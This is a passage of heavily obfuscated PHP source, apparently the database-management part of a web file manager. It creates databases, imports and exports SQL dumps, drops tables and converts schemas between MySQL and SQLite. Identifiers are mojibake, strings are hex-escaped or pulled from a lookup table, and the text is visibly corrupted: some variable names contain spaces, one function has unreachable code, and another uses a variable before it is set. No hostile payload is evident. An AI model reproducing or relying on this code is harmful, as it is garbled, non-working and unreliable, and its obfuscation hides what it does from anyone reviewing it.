$ß¿ÌíÂ„[12]), $this->parseLimit(!empty($©â´Úã[$ß¿ÌíÂ„[379]]) ? $©â´Úã[$ß¿ÌíÂ„[379]] : $ß¿ÌíÂ„[12]), $this->parseUnion(!empty($©â´Úã[$ß¿ÌíÂ„[434]]) ? $©â´Úã[$ß¿ÌíÂ„[434]] : $ß¿ÌíÂ„[12]), $this->parseComment(!empty($©â´Úã[$ß¿ÌíÂ„[441]]) ? $©â´Úã[$ß¿ÌíÂ„[441]] : $ß¿ÌíÂ„[12])), $‘ÈÓÌÑĞ); return $‘ÈÓÌÑĞ; } public function getLastSql($È‰ıïÚé = '') { return $È‰ıïÚé ? $this->modelSql[$È‰ıïÚé] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($«“Ò™ë) { return addslashes($«“Ò™ë); } public function setModel($Ë·¬¼Ôê) { $this->model = $Ë·¬¼Ôê; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($„µÈ’„ = array()) { $§Üµşïâ =& $_SERVER[‹‰”››ê]; if (empty($„µÈ’„)) { $„µÈ’„ = $GLOBALS[$§Üµşïâ[6]][$§Üµşïâ[21]]; } $this->database = $„µÈ’„; } public function model($¼‹™­å‘ = '') { return new ModelBase($¼‹™­å‘, $_SERVER[‹‰”››ê][12], $this->database); } public function db($ïõ¤ç Î = false) { $ï¸•”Ğ‹ =& $_SERVER[‹‰”››ê]; $íŸ¬Ÿæé = array_change_key_case($this->database); if ($this->dbType() == $ï¸•”Ğ‹[13] || !$ïõ¤ç Î) { return $this->model()->db(); } $§àš®İú = $íŸ¬Ÿæé[$ï¸•”Ğ‹[1065]]; $íŸ¬Ÿæé[$ï¸•”Ğ‹[1065]] = $ï¸•”Ğ‹[12]; if ($íŸ¬Ÿæé[$ï¸•”Ğ‹[1060]] == $ï¸•”Ğ‹[1057]) { $Ûœ¯¯æã = $íŸ¬Ÿæé[$ï¸•”Ğ‹[1066]]; $íŸ¬Ÿæé[$ï¸•”Ğ‹[1066]] = substr($Ûœ¯¯æã, 0, strrpos($Ûœ¯¯æã, $ï¸•”Ğ‹[1152])); } $this->database = $íŸ¬Ÿæé; $õËĞƒÛ· = $this->model()->db(); try { $ª¨ŠÆŒÌ = $õËĞƒÛ·->execute("\163\x68\157\x77\x20\x64\x61\164\141\x62\x61\x73\x65\x73\x20\x6c\151\x6b\145\x20\47{$§àš®İú}\47"); } catch (Exception $ÉÉãÎø») { } if (!$ª¨ŠÆŒÌ) { $õËĞƒÛ·->execute("\143\162\x65\x61\164\145\40\x64\141\164\141\142\x61\163\145\40\x60{$§àš®İú}\140"); } $íŸ¬Ÿæé[$ï¸•”Ğ‹[1065]] = $§àš®İú; if ($íŸ¬Ÿæé[$ï¸•”Ğ‹[1060]] == $ï¸•”Ğ‹[1057]) { $íŸ¬Ÿæé[$ï¸•”Ğ‹[1066]] .= $ï¸•”Ğ‹[1152] . $§àš®İú; } $this->database = $íŸ¬Ÿæé; $õËĞƒÛ·->execute("\165\163\145\x20\x60{$§àš®İú}\140"); return $õËĞƒÛ·; } public function createTable($şô Š®´, &$µŒÀªñÀ) { $¤ıË—…– =& $_SERVER[‹‰”››ê]; if (!IO::exist($şô Š®´)) { ActionCall($¤ıË—…–[1153], !0, 0); show_json(LNG($¤ıË—…–[1154]), !1); } $î¸‹Ó³ = $this->model()->db(); $…ÁÁ¼›¹ = sqlSplit(IO::getContent($şô Š®´)); foreach ($…ÁÁ¼›¹ as $Ù²ì®Äİ) { $›„ÂúÑ‚ = stripos($Ù²ì®Äİ, $¤ıË—…–[1155]) === 0; if ($›„ÂúÑ‚) { $µŒÀªñÀ->task[$¤ıË—…–[1156]] += 1; } $î¸‹Ó³->execute($Ù²ì®Äİ); if ($›„ÂúÑ‚) { preg_match($¤ıË—…–[1157], $Ù²ì®Äİ, $ĞŸÖ‰Ì); $µŒÀªñÀ->task[$¤ıË—…–[1158]] = $ĞŸÖ‰Ì[1]; $µŒÀªñÀ->update(1); } } } public function insertTable($ÍÎÀ±‚‹, &$¿¬Æô®») { $…Æ’ÂÂ¨ =& $_SERVER[‹‰”››ê]; $‡öŒ»³« = $this->model()->db(); $ŞïÛĞ³“ = $¸æÍ…úö ? array($¸æÍ…úö) : $‡öŒ»³«->getTables(); foreach ($ÍÎÀ±‚‹ as $ƒãÊÌÀ°) { $¸æÍ…úö = basename($ƒãÊÌÀ°, $…Æ’ÂÂ¨[880]); if (!in_array($¸æÍ…úö, $ŞïÛĞ³“)) { continue; } $¿¬Æô®»->task[$…Æ’ÂÂ¨[1158]] = $¸æÍ…úö; if (get_filesize($ƒãÊÌÀ°) == 0) { continue; } $Ã»ñàû³ = $this->sqlToDb($ƒãÊÌÀ°, $¿¬Æô®»); if (!$Ã»ñàû³) { ActionCall($…Æ’ÂÂ¨[1153], !0, 0); show_json(LNG($…Æ’ÂÂ¨[1159]) . "\133{$¸æÍ…úö}\x5d", !1); } } } public function sqlFromDb($¼‡Å·ÊÅ, $¦¥áºµ, &$æ¹¶¿Ò‘, $¹Œ¾­³… = '') { if ($æ¹¶¿Ò‘) { $æ¹¶¿Ò‘->task[$_SERVER[‹‰”››ê][1158]] = $¼‡Å·ÊÅ; } $ô­îü“¾ = $this->model($¼‡Å·ÊÅ); $Ò¨º¾é = 0; $¯ÛÕÊ½ï = 0; $ì„×ˆ» = 10000; $®ó²ã¼Å = fopen($¦¥áºµ, $_SERVER[‹‰”››ê][1160]); $óªøÄ“® = $ô­îü“¾->getPk(); $æÀ•ÀÃ« = $ô­îü“¾->getDbFields(); $“Æ ØÍ = $_SERVER[‹‰”››ê][12]; if ($GLOBALS[$_SERVER[‹‰”››ê][879]] && in_array($¼‡Å·ÊÅ, array($_SERVER[‹‰”››ê][1161], $_SERVER[‹‰”››ê][1162]))) { $“Æ ØÍ = $¼‡Å·ÊÅ; } do { $“³Ñë­ = array($óªøÄ“® => array($_SERVER[‹‰”››ê][1107], $¯ÛÕÊ½ï)); $ªÊ»…§½ = $ô­îü“¾->where($“³Ñë­)->field($æÀ•ÀÃ«)->order($óªøÄ“® . $_SERVER[‹‰”››ê][1163])->limit($ì„×ˆ»)->select(); $ªÊ»…§½ = !empty($ªÊ»…§½) ? $ªÊ»…§½ : array(); if (!($–ÁùŞï = count($ªÊ»…§½))) { break; } $ç¤Ë‚×å = end($ªÊ»…§½); $¯ÛÕÊ½ï = $ç¤Ë‚×å[$óªøÄ“®]; $±–“Şé = array(); foreach ($ªÊ»…§½ as $è£¶ü•) { if ($“Æ ØÍ) { if ($¼‡Å·ÊÅ == $_SERVER[‹‰”››ê][1161]) { if ($è£¶ü•[$_SERVER[‹‰”››ê][33]] == $_SERVER[‹‰”››ê][1164]) { $ÓÔÄ†¯Ì = json_decode($è£¶ü•[$_SERVER[‹‰”››ê][462]], !0); if ($ÓÔÄ†¯Ì[$_SERVER[‹‰”››ê][32]] == $GLOBALS[$_SERVER[‹‰”››ê][879]] && $ÓÔÄ†¯Ì[$_SERVER[‹‰”››ê][840]] != 1) { continue; } } } else { if ($è£¶ü•[$_SERVER[‹‰”››ê][33]] == $_SERVER[‹‰”››ê][1165] && $è£¶ü•[$_SERVER[‹‰”››ê][97]] == $_SERVER[‹‰”››ê][875]) { continue; } } } if ($¹Œ¾­³…) { $è£¶ü•[$_SERVER[‹‰”››ê][87]] = "\173\151\157\x3a{$¹Œ¾­³…}\175" . substr($è£¶ü•[$_SERVER[‹‰”››ê][87]], strlen("\x7b\151\157\x3a{$è£¶ü•[$_SERVER[‹‰”››ê][913]]}\x7d")); $è£¶ü•[$_SERVER[‹‰”››ê][913]] = $¹Œ¾­³…; } $±–“Şé[] = $_SERVER[‹‰”››ê][1166] . $this->sqlEncode($è£¶ü•) . $_SERVER[‹‰”››ê][1167]; } $âÒç—™Ü = "\111\x4e\123\x45\x52\x54\x20\x49\x4e\x54\x4f\x20\140{$¼‡Å·ÊÅ}\140\40\x28\140" . implode($_SERVER[‹‰”››ê][1168], $æÀ•ÀÃ«) . $_SERVER[‹‰”››ê][1169]; fwrite($®ó²ã¼Å, $âÒç—™Ü . implode($_SERVER[‹‰”››ê][1170], $±–“Şé) . $_SERVER[‹‰”››ê][74] . PHP_EOL); $Ò¨º¾é += $–ÁùŞï; if ($æ¹¶¿Ò‘) { $æ¹¶¿Ò‘->update($–ÁùŞï); } } while ($ì„×ˆ» == $–ÁùŞï); fclose($®ó²ã¼Å); return $Ò¨º¾é; } public function sqlToDb($…ª°“Ø, &$–èµÛÅ“) { $Ì£Ô¯éÅ =& $_SERVER[‹‰”››ê]; $º»ª¥ÚŒ = $this->model()->db(); $Ü›Ù„ØÏ = @fopen($…ª°“Ø, $Ì£Ô¯éÅ[1171]); if (!$Ü›Ù„ØÏ) { return !1; } $ê¤…ÉÈï = 0; $ÊƒÀìø  = $Ì£Ô¯éÅ[12]; $Øî¹û»¹ = array(); $Ï¬î¡ÔŠ = $this->dbType(); $©ÂÉÅ»­ = $Ï¬î¡ÔŠ == $Ì£Ô¯éÅ[13] ? 500 : 2000; $¸€ƒŸı = basename($…ª°“Ø, $Ì£Ô¯éÅ[880]); $¨£ø¶´ = 0; $ŸÑŞ‚ÁÆ = 4194304; while (!feof($Ü›Ù„ØÏ)) { $Ãè…¥’¥ = trim(fgets($Ü›Ù„ØÏ)); if (!$Ãè…¥’¥) { continue; } $×µéº« = $this->sqlDecode($Ãè…¥’¥, $Ï¬î¡ÔŠ, $¸€ƒŸı); if (stripos($×µéº«, $Ì£Ô¯éÅ[442]) === 0) { if (!$ÊƒÀìø ) { $ÊƒÀìø  = $×µéº« . $Ì£Ô¯éÅ[53]; } continue; } if ($–èµÛÅ“) { $–èµÛÅ“->task[$Ì£Ô¯éÅ[1156]] += 1; } $ê¤…ÉÈï++; $Øî¹û»¹[] = rtrim(rtrim(trim($×µéº«), $Ì£Ô¯éÅ[50]), $Ì£Ô¯éÅ[74]); $˜¼›ë = null; $²ë±ÖÁü = strlen($×µéº«); $¨£ø¶´ += $²ë±ÖÁü; $µìİ÷ = strlen($ÊƒÀìø ) + $¨£ø¶´ + (count($Øî¹û»¹) - 1); if ($µìİ÷ >= $ŸÑŞ‚ÁÆ) { $˜¼›ë = array_pop($Øî¹û»¹); if ($ê¤…ÉÈï > 1) { $ê¤…ÉÈï--; } } if ($ê¤…ÉÈï >= $©ÂÉÅ»­ || $˜¼›ë) { $×µéº« = $ÊƒÀìø  . implode($Ì£Ô¯éÅ[50], $Øî¹û»¹); if (!$º»ª¥ÚŒ->execute($×µéº«)) { return !1; } if ($–èµÛÅ“) { $–èµÛÅ“->update($ê¤…ÉÈï); } $Øî¹û»¹ = array(); $ê¤…ÉÈï = 0; $¨£ø¶´ = 0; if ($˜¼›ë) { $Øî¹û»¹ = array($˜¼›ë); $ê¤…ÉÈï = 1; $¨£ø¶´ = $²ë±ÖÁü; } } } fclose($Ü›Ù„ØÏ); if (!empty($Øî¹û»¹)) { $×µéº« = $ÊƒÀìø  . implode($Ì£Ô¯éÅ[50], $Øî¹û»¹); if (!$º»ª¥ÚŒ->execute($×µéº«)) { return !1; } if ($–èµÛÅ“) { $–èµÛÅ“->update($ê¤…ÉÈï); } } return !0; } public function dropTable($óÇÏ íî = null) { $öõÂüáı = $this->model()->db(); $õÂšå = $óÇÏ íî ? array($óÇÏ íî) : $öõÂüáı->getTables(); if (!$õÂšå) { return; } foreach ($õÂšå as $óÇÏ íî) { if ($óÇÏ íî) { $óÇÏ íî = strtolower($óÇÏ íî); } else { continue; } $öõÂüáı->execute("\144\162\157\160\40\164\x61\x62\x6c\x65\40\151\146\40\x65\170\x69\x73\164\x73\x20\140{$óÇÏ íî}\x60"); } } private function sqlEncode($„»…ö¤) { $šç÷Â™« =& $_SERVER[‹‰”››ê]; $È´ë ¸ = array(); foreach ($„»…ö¤ as $ôï¡ŠÃ—) { if (is_array($ôï¡ŠÃ—)) { $ôï¡ŠÃ— = json_encode_force($ôï¡ŠÃ—); } $ôï¡ŠÃ— = addslashes($ôï¡ŠÃ—); $ôï¡ŠÃ— = str_replace(array($šç÷Â™«[1172], $šç÷Â™«[288], $šç÷Â™«[429]), array($šç÷Â™«[1173], $šç÷Â™«[1174], $šç÷Â™«[1175]), $ôï¡ŠÃ—); $È´ë ¸[] = $ôï¡ŠÃ—; } return $šç÷Â™«[58] . implode($šç÷Â™«[1176], $È´ë ¸) . $šç÷Â™«[58]; } private function sqlDecode($àº¦ÙÔ–, $­ßÌ¤¢, $Åéß±Ú = '') { $û¹÷»Ñ =& $_SERVER[‹‰”››ê]; $àº¦ÙÔ– = str_replace(array($û¹÷»Ñ[1173], $û¹÷»Ñ[1174], $û¹÷»Ñ[1175]), array($û¹÷»Ñ[1172], $û¹÷»Ñ[288], $û¹÷»Ñ[429]), $àº¦ÙÔ–); if ($­ßÌ¤¢ == $û¹÷»Ñ[13]) { $àº¦ÙÔ– = str_ireplace($û¹÷»Ñ[1177], $û¹÷»Ñ[59], $àº¦ÙÔ–); $àº¦ÙÔ– = stripslashes($àº¦ÙÔ–); } return preg_replace($û¹÷»Ñ[1178], $û¹÷»Ñ[12], $àº¦ÙÔ–); if ($­ßÌ¤¢ == $û¹÷»Ñ[13]) { return $Åéß±Ú != $û¹÷»Ñ[874] ? stripslashes($àº¦ÙÔ–) : $àº¦ÙÔ–; } if ($Åéß±Ú == $û¹÷»Ñ[874]) { $àº¦ÙÔ– = str_replace($û¹÷»Ñ[1179], $û¹÷»Ñ[121], stripslashes($àº¦ÙÔ–)); } return $àº¦ÙÔ–; } public function getSqlFile($Ó•´ËÉ† = '') { $ºÃ²Ì³” =& $_SERVER[‹‰”››ê]; $çë·˜Íë = $this->dbType(!0); $Õ¤ÆÑ€‚ = CONTROLLER_DIR . "\x69\x6e\163\x74\x61\x6c\x6c\57\x64\141\x74\141\x2f{$çë·˜Íë}\56\x73\x71\154"; $—‰Ë´£ = file_get_contents($Õ¤ÆÑ€‚); $£÷ ›¶ = $ºÃ²Ì³”[1180] . ($çë·˜Íë == $ºÃ²Ì³”[898] ? $ºÃ²Ì³”[1181] : $ºÃ²Ì³”[1182]) . $ºÃ²Ì³”[1183]; preg_match_all($£÷ ›¶, $—‰Ë´£, $ôøíÇà¿); $³øä = $ôøíÇà¿[1]; $¨áÅ©ÅÂ = $this->model()->db(); $ïò†ññ = $¨áÅ©ÅÂ->getTables(); $í»ÍÀÇ = TEMP_FILES . $ºÃ²Ì³”[1184] . date($ºÃ²Ì³”[262]) . $ºÃ²Ì³”[8]; del_dir($í»ÍÀÇ); mk_dir($í»ÍÀÇ); $¥Ù÷Çøî = $í»ÍÀÇ . $ºÃ²Ì³”[1185]; $â®ŒÖİ = $í»ÍÀÇ . $ºÃ²Ì³”[1186]; $µá¥ = $çë·˜Íë == $ºÃ²Ì³”[13] ? $ºÃ²Ì³”[898] : $ºÃ²Ì³”[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\x61\x6c\154\x2f\x64\x61\164\x61\57{$µá¥}\56\163\x71\154", $í»ÍÀÇ); @touch($í»ÍÀÇ . $çë·˜Íë . $ºÃ²Ì³”[880]); $ò¥³€¿™ = fopen($¥Ù÷Çøî, $ºÃ²Ì³”[1160]); $«Ä¶¿è² = fopen($â®ŒÖİ, $ºÃ²Ì³”[1160]); if ($çë·˜Íë == $ºÃ²Ì³”[13]) { $ïò†ññ = array_diff($ïò†ññ, array($ºÃ²Ì³”[872], $ºÃ²Ì³”[873])); $™ÚˆÎÃ¿ = array($ºÃ²Ì³”[1187], $ºÃ²Ì³”[1188], $ºÃ²Ì³”[1189]); fwrite($«Ä¶¿è², implode(PHP_EOL, $™ÚˆÎÃ¿) . PHP_EOL . PHP_EOL); foreach ($ïò†ññ as $ÀŠ©¤—å) { $˜â§À©ä = $this->sqlFromSqlite($ÀŠ©¤—å); if (!$˜â§À©ä[$ºÃ²Ì³”[13]]) { continue; } fwrite($«Ä¶¿è², $˜â§À©ä[$ºÃ²Ì³”[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÀŠ©¤—å, $³øä)) { fwrite($ò¥³€¿™, $˜â§À©ä[$ºÃ²Ì³”[898]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ïò†ññ as $ÀŠ©¤—å) { $˜â§À©ä = $this->sqlFromMysql($ÀŠ©¤—å); if (!$˜â§À©ä[$ºÃ²Ì³”[898]]) { continue; } fwrite($ò¥³€¿™, $˜â§À©ä[$ºÃ²Ì³”[898]] . PHP_EOL . PHP_EOL); if (!in_array($ÀŠ©¤—å, $³øä)) { fwrite($«Ä¶¿è², $˜â§À©ä[$ºÃ²Ì³”[13]] . PHP_EOL . PHP_EOL); } } } fclose($ò¥³€¿™); fclose($«Ä¶¿è²); $—‰Ë´£ = array($ºÃ²Ì³”[898] => $¥Ù÷Çøî, $ºÃ²Ì³”[13] => $â®ŒÖİ); return $Ó•´ËÉ† ? $—‰Ë´£[$Ó•´ËÉ†] : $—‰Ë´£; } public function dbType($¼—õ‚Ğ¶ = false) { $ãÃ¿¾Ì¯ =& $_SERVER[‹‰”››ê]; $Ÿ Ó ‹Å = $¼—õ‚Ğ¶ ? $GLOBALS[$ãÃ¿¾Ì¯[6]][$ãÃ¿¾Ì¯[21]] : $this->database; $Ÿ Ó ‹Å = array_change_key_case($Ÿ Ó ‹Å); $„å¥å‘¼ = $Ÿ Ó ‹Å[$ãÃ¿¾Ì¯[1060]]; if ($„å¥å‘¼ == $ãÃ¿¾Ì¯[1057]) { $§·¤Íåæ = explode($ãÃ¿¾Ì¯[4], $Ÿ Ó ‹Å[$ãÃ¿¾Ì¯[1066]]); $„å¥å‘¼ = $§·¤Íåæ[0]; } $ ¸Ä‹ã¨ = array($ãÃ¿¾Ì¯[1190] => $ãÃ¿¾Ì¯[13], $ãÃ¿¾Ì¯[1005] => $ãÃ¿¾Ì¯[898]); if (isset($ ¸Ä‹ã¨[$„å¥å‘¼])) { $„å¥å‘¼ = $ ¸Ä‹ã¨[$„å¥å‘¼]; } return $„å¥å‘¼; } public function sqlFromMysql($ í–ú™Ä, $¸ü½¶ö = '') { $‘×ø²Ææ =& $_SERVER[‹‰”››ê]; $¸üÒöÓÆ = $this->model()->db(); $—èËåå = $¸üÒöÓÆ->query($‘×ø²Ææ[1191] . $ í–ú™Ä . $‘×ø²Ææ[473]); if (!$—èËåå || !$—èËåå[0]) { return !1; } $Ö·›â¤Ÿ = _get($—èËåå[0], $‘×ø²Ææ[1192], $‘×ø²Ææ[12]); if (!$Ö·›â¤Ÿ) { return !1; } $“ÀîóÖ„ = "\x44\122\x4f\x50\x20\124\101\x42\x4c\105\40\x49\x46\40\105\x58\x49\x53\124\x53\40\140{$ í–ú™Ä}\x60\x3b" . PHP_EOL . $Ö·›â¤Ÿ . $‘×ø²Ææ[74]; if ($¸ü½¶ö && $¸ü½¶ö == $‘×ø²Ææ[898]) { return $“ÀîóÖ„; } $úâÜüüı = array_change_key_case($GLOBALS[$‘×ø²Ææ[6]][$‘×ø²Ææ[21]]); $Ê˜ğŠßÖ = $úâÜüüı[$‘×ø²Ææ[1065]]; $ÓòŸ±Ã = $‘×ø²Ææ[1193] . $Ê˜ğŠßÖ . $‘×ø²Ææ[1194] . $ í–ú™Ä . $‘×ø²Ææ[58]; $”Š¶òÃ = $‘×ø²Ææ[1195] . $ í–ú™Ä . $‘×ø²Ææ[993]; $´í²äùÈ = $¸üÒöÓÆ->query($ÓòŸ±Ã); if (empty($´í²äùÈ)) { $Ä‹ÈÜ‚„ = array($‘×ø²Ææ[898] => $‘×ø²Ææ[12], $‘×ø²Ææ[13] => $‘×ø²Ææ[12]); return $¸ü½¶ö ? $Ä‹ÈÜ‚„[$¸ü½¶ö] : $Ä‹ÈÜ‚„; } $Øµ´¦ªç = $¸üÒöÓÆ->query($”Š¶òÃ); $ŒñÑ‚ºÜ = $‘×ø²Ææ[12]; $³¤Æ©í = array(); foreach ($Øµ´¦ªç as $”¯²ƒ„·) { if (!$ŒñÑ‚ºÜ && $”¯²ƒ„·[$‘×ø²Ææ[1196]] == $‘×ø²Ææ[1197]) { $ŒñÑ‚ºÜ = $”¯²ƒ„·[$‘×ø²Ææ[1198]]; } if (isset($³¤Æ©í[$”¯²ƒ„·[$‘×ø²Ææ[1196]]])) { $³¤Æ©í[$”¯²ƒ„·[$‘×ø²Ææ[1196]]][$‘×ø²Ææ[1199]][] = $”¯²ƒ„·[$‘×ø²Ææ[1198]]; continue; } $³¤Æ©í[$”¯²ƒ„·[$‘×ø²Ææ[1196]]] = array($‘×ø²Ææ[1200] => $”¯²ƒ„·[$‘×ø²Ææ[1196]], $‘×ø²Ææ[1199] => array($”¯²ƒ„·[$‘×ø²Ææ[1198]]), $‘×ø²Ææ[1201] => $”¯²ƒ„·[$‘×ø²Ææ[1202]] == $‘×ø²Ææ[91] ? 0 : 1); } $â¯¸õ½ = array(); foreach ($³¤Æ©í as $”¯²ƒ„·) { $“¿ïüçı = $”¯²ƒ„·[$‘×ø²Ææ[1200]] == $‘×ø²Ææ[1197]; $İäˆÃ£ = array($‘×ø²Ææ[1203], $”¯²ƒ„·[$‘×ø²Ææ[1201]] == $‘×ø²Ææ[91] && !$“¿ïüçı ? $‘×ø²Ææ[1204] : $‘×ø²Ææ[12], $‘×ø²Ææ[1205], $‘×ø²Ææ[1206] . $ í–ú™Ä . $‘×ø²Ææ[11] . ($“¿ïüçı ? $‘×ø²Ææ[1207] : $”¯²ƒ„·[$‘×ø²Ææ[1200]]) . $‘×ø²Ææ[121], $‘×ø²Ææ[1208], $‘×ø²Ææ[121] . $ í–ú™Ä . $‘×ø²Ææ[121], $‘×ø²Ææ[1209] . implode($‘×ø²Ææ[1210], $”¯²ƒ„·[$‘×ø²Ææ[1199]]) . $‘×ø²Ææ[1211]); $â¯¸õ½[] = implode($‘×ø²Ææ[53], $İäˆÃ£) . $‘×ø²Ææ[74]; } $Ú¯ŞÔÎ€ = array(); $Ç”¸¡Ğ = array($‘×ø²Ææ[1212] => $‘×ø²Ææ[1213], $‘×ø²Ææ[1213] => $‘×ø²Ææ[1213], $‘×ø²Ææ[375] => $‘×ø²Ææ[402], $‘×ø²Ææ[374] => $‘×ø²Ææ[402]); foreach ($´í²äùÈ as $”¯²ƒ„·) { $İäˆÃ£ = array($‘×ø²Ææ[121] . $”¯²ƒ„·[$‘×ø²Ææ[1214]] . $‘×ø²Ææ[121], isset($Ç”¸¡Ğ[$”¯²ƒ„·[$‘×ø²Ææ[1215]]]) ? $Ç”¸¡Ğ[$”¯²ƒ„·[$‘×ø²Ææ[1215]]] : $”¯²ƒ„·[$‘×ø²Ææ[1216]], $”¯²ƒ„·[$‘×ø²Ææ[1217]] == $‘×ø²Ææ[991] ? $‘×ø²Ææ[1218] : $‘×ø²Ææ[1219], $”¯²ƒ„·[$‘×ø²Ææ[1214]] == $ŒñÑ‚ºÜ ? $‘×ø²Ææ[1220] : $‘×ø²Ææ[12], $”¯²ƒ„·[$‘×ø²Ææ[1042]] ? strtoupper(str_replace($‘×ø²Ææ[11], $‘×ø²Ææ[12], $”¯²ƒ„·[$‘×ø²Ææ[1042]])) : $‘×ø²Ææ[12]); $Ú¯ŞÔÎ€[] = trim(implode($‘×ø²Ææ[53], $İäˆÃ£)); } $ÈŸèëÉ = array($‘×ø²Ææ[1221] . $ í–ú™Ä . $‘×ø²Ææ[1222], $‘×ø²Ææ[1223] . $ í–ú™Ä . $‘×ø²Ææ[1224], implode($‘×ø²Ææ[50] . PHP_EOL, $Ú¯ŞÔÎ€), $‘×ø²Ææ[1039]); $Î™¤£Ñ¢ = implode(PHP_EOL, array_merge($ÈŸèëÉ, $â¯¸õ½)); if ($¸ü½¶ö && $¸ü½¶ö == $‘×ø²Ææ[13]) { return $Î™¤£Ñ¢; } $Ä‹ÈÜ‚„ = array($‘×ø²Ææ[898] => $“ÀîóÖ„, $‘×ø²Ææ[13] => $Î™¤£Ñ¢); return $¸ü½¶ö ? $Ä‹ÈÜ‚„[$¸ü½¶ö] : $Ä‹ÈÜ‚„; } public function sqlFromSqlite($Â¤ªíôñ, $ÒÊÂÍ† = '') { $¿™„óªà =& $_SERVER[‹‰”››ê]; $¼ÕİğÎ = $this->model()->db(); $…îú«üÀ = "\120\122\x41\x47\x4d\101\x20\124\x41\x42\x4c\105\x5f\x49\116\106\117\x20\x28\x27{$Â¤ªíôñ}\47\x29"; $óƒğÈöÍ = "\123\x45\114\x45\103\x54\x20\52\x20\106\x52\117\x4d\x20\x73\x71\x6c\x69\x74\x65\x5f\155\141\x73\164\145\162\x20\127\110\x45\x52\x45\40\x74\x62\154\x5f\156\141\155\145\x20\x3d\40\47{$Â¤ªíôñ}\47"; $ø‹şâ¶ = $¼ÕİğÎ->query($…îú«üÀ); if (empty($ø‹şâ¶)) { $ÔëáÄè = array($¿™„óªà[898] => $¿™„óªà[12], $¿™„óªà[13] => $¿™„óªà[12]); return $ÒÊÂÍ† ? $ÔëáÄè[$ÒÊÂÍ†] : $ÔëáÄè; } $¨³éº®† = $¼ÕİğÎ->query($óƒğÈöÍ); $»®¥ÔÏ = $µ«ôöÏ¸ = array(); foreach ($¨³éº®† as $Û‰§°ùª) { if ($Û‰§°ùª[$¿™„óªà[33]] == $¿™„óªà[368]) { $»®¥ÔÏ[] = $Û‰§°ùª[$¿™„óªà[1225]]; } else { $µ«ôöÏ¸[$Û‰§°ùª[$¿™„óªà[32]]] = $Û‰§°ùª[$¿™„óªà[1225]]; } } $í…ÉÒ½· = array_merge(array($¿™„óªà[1221] . $Â¤ªíôñ . $¿™„óªà[121]), $»®¥ÔÏ, array_values($µ«ôöÏ¸)); $í…ÉÒ½· = implode($¿™„óªà[74] . PHP_EOL, $í…ÉÒ½·) . $¿™„óªà[74]; if ($ÒÊÂÍ† && $ÒÊÂÍ† == $¿™„óªà[13]) { return $í…ÉÒ½·; } $¹¶®›ñ = array(); foreach ($µ«ôöÏ¸ as $Ã®¹°ñ– => $ÂãÇúƒâ) { $šû¯ñü¹ = str_replace($¿™„óªà[1226] . $Â¤ªíôñ . $¿™„óªà[11], $¿™„óªà[12], $Ã®¹°ñ–); $šû¯ñü¹ = str_replace($Â¤ªíôñ . $¿™„óªà[11], $¿™„óªà[12], $Ã®¹°ñ–); $¾•İ—½ô = str_replace(array($¿™„óªà[121], $¿™„óªà[1050]), $¿™„óªà[473], substr($ÂãÇúƒâ, stripos($ÂãÇúƒâ, $¿™„óªà[349]))); $¹¶®›ñ[$šû¯ñü¹] = $¾•İ—½ô; } $—©£Ã´¶ = array(); $¹¦¶ï‘ = array($¿™„óªà[1213] => $¿™„óªà[1227], $¿™„óªà[402] => $¿™„óªà[1228]); $°æíÙ¾ = $×“¿­Â± = $¿™„óªà[12]; foreach ($ø‹şâ¶ as $Û‰§°ùª) { if ($Û‰§°ùª[$¿™„óªà[57]] == $¿™„óªà[91]) { $°æíÙ¾ = $Û‰§°ùª[$¿™„óªà[32]]; } $á¿¿Àœ­ = $Û‰§°ùª[$¿™„óªà[33]]; if ($á¿¿Àœ­ == $¿™„óªà[1229] && isset($¹¶®›ñ[$Û‰§°ùª[$¿™„óªà[32]]])) { $á¿¿Àœ­ = $¿™„óªà[1230]; } $ùøâ œ¯ = array($¿™„óªà[473] . $Û‰§°ùª[$¿™„óªà[32]] . $¿™„óªà[473], _get($¹¦¶ï‘, $á¿¿Àœ­, $á¿¿Àœ­), $Û‰§°ùª[$¿™„óªà[35]] == $¿™„óªà[91] ? $¿™„óªà[1218] : $¿™„óªà[1231] . $Û‰§°ùª[$¿™„óªà[56]], $Û‰§°ùª[$¿™„óªà[57]] == $¿™„óªà[91] ? $¿™„óªà[1232] : $¿™„óªà[12]); $—©£Ã´¶[] = trim(implode($¿™„óªà[53], $ùøâ œ¯)); } foreach ($¹¶®›ñ as $šû¯ñü¹ => $¾•İ—½ô) { if ($šû¯ñü¹ == $¿™„óªà[1207]) { $ŠÌúò²± = $×“¿­Â± = $¿™„óªà[1233] . $°æíÙ¾ . $¿™„óªà[1234]; } else { $ŠÌúò²± = (stripos($šû¯ñü¹, $¿™„óªà[11]) ? $¿™„óªà[1235] : $¿™„óªà[12]) . ($¿™„óªà[1236] . $šû¯ñü¹ . $¿™„óªà[1237] . $¾•İ—½ô); } $—©£Ã´¶[] = $ŠÌúò²±; } if ($°æíÙ¾ && !$×“¿­Â±) { $—©£Ã´¶ = array_merge(array($¿™„óªà[1233] . $°æíÙ¾ . $¿™„óªà[1234]), $—©£Ã´¶); } $Ñâ†¾Ø¼ = array($¿™„óªà[1238] . $Â¤ªíôñ . $¿™„óªà[1239], $¿™„óªà[1240] . $Â¤ªíôñ . $¿™„óªà[1241], implode($¿™„óªà[50] . PHP_EOL, $—©£Ã´¶), $¿™„óªà[1242]); $¯ØôÏ†  = implode(PHP_EOL, $Ñâ†¾Ø¼); if ($ÒÊÂÍ† && $ÒÊÂÍ† == $¿™„óªà[898]) { return $¯ØôÏ† ; } $ÔëáÄè = array($¿™„óªà[898] => $¯ØôÏ† , $¿™„óªà[13] => $í…ÉÒ½·); return $ÒÊÂÍ† ? $ÔëáÄè[$ÒÊÂÍ†] : $ÔëáÄè; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÇÅªçú, $Ïø±§®) { $¬ğéŒÍè =& $_SERVER[‹‰”››ê]; $÷ôÖ§øÎ = $Ïø±§®; $GLOBALS[$¬ğéŒÍè[1243]] = $¬ğéŒÍè[1244] . $ÇÅªçú; Hook::trigger($¬ğéŒÍè[1244] . $ÇÅªçú . $¬ğéŒÍè[1245], $÷ôÖ§øÎ); $µÏÎâœÀ = 